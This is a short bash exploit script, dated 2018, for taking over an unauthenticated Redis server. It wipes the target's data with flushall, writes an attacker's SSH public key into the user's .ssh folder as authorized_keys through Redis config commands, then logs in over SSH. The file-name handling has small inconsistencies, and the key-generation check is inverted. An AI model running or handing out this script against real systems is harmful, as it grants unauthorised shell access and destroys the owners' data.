#!/bin/bash
#
# Redis Insecurity
# Macarthur Inbody 2018
# <admin-contact@transcendental.us>
# AGPLv3 or Later 
# Use for a vulnerable redis server.

if [[ $# -le 2 ]];then
	echo "Usage ./$0 {TARGET_HOST} {USERNAME_TO_TARGET} {LOCATION_OF_.SSH_FOLDER}";
else
	#check to see if we don't already have an id_rsa.redis file.
	if [ -f .ssh/id_rsa.redis ];then
		ssh-keygen -t rsa -f .ssh/id_rsa.redis
	fi
	#create the file to work the way that they want.
	$(echo -e "\n\n"; cat .ssh/id_rsa.pub.redis; echo -e "\n\n") > key.txt

	#tell redis to flushall commands
	redis-cli -h "$1" flushall
	#send our file to the server's memory.
	redis-cli -h "$1" -x set ohnovar < key.txt
	#set our directory to the ssh keys.
	#for a certain site here's where the target folder is "/var/lib/redis/.ssh/" You need to see this
	#to the location of the .ssh folder. So if you're targetting the user bob it needs to be "/bob/.ssh"
	redis-cli -h "$1" config set dir "$3"
	#set the database name to the authorized_keys
	redis-cli -h "$1" config set dbfilename "authorized_keys"
	#save our current key to this database.
	redis-cli -h "$1" save
	#ssh to the server with our new key as the user provided.
	ssh -i .ssh/id_rsa.redis "$2"@"$1"
	#remove the key we generated previously. Don't want to leave it open to others conencting back to us.
	rm -v id_rsa.redis id_rsa.redis.pub
fi
